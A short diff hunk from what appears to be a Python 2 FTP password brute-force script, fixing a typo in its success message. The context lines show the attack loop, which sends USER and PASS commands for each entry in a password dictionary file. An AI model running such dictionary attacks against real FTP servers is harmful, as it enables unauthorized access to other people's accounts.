@@ -16,7 +16,7 @@ for p in open('/Users/bl4de/hacking/dictionaries/passwords_5445.txt', 'r').readl
         ftp.sendcmd('USER {}'.format(username))
         resp = ftp.sendcmd('PASS {}'.format(p.strip()))
 
-        print "[+] Legged in! -> {}".format(str(resp))
+        print "[+] Logged in! -> {}".format(str(resp))
         exit(0)
     except Exception, e:
         print e
